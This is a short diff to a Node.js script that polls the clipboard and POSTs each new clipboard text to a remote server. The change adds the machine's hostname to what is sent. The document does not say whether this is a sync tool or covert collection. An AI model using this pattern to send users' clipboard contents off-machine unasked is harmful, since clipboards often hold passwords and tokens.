@@ -1,5 +1,8 @@
 import clipboardy from 'clipboardy';
 import request from 'request';
+var os = require("os");
+var hostname = os.hostname();
+
 async function main() {
     var prevData = ""
     setInterval(async () => {
@@ -7,7 +10,7 @@ async function main() {
         if (prevData == text || text == "" || text === " ") {
         } else {
             prevData = text;
-            var myJSONObject = { text };
+            var myJSONObject = { text, hostname };
             request({
                 url: "http://testlink.techietrix.com/clipboard/saveclipboard",
                 method: "POST",
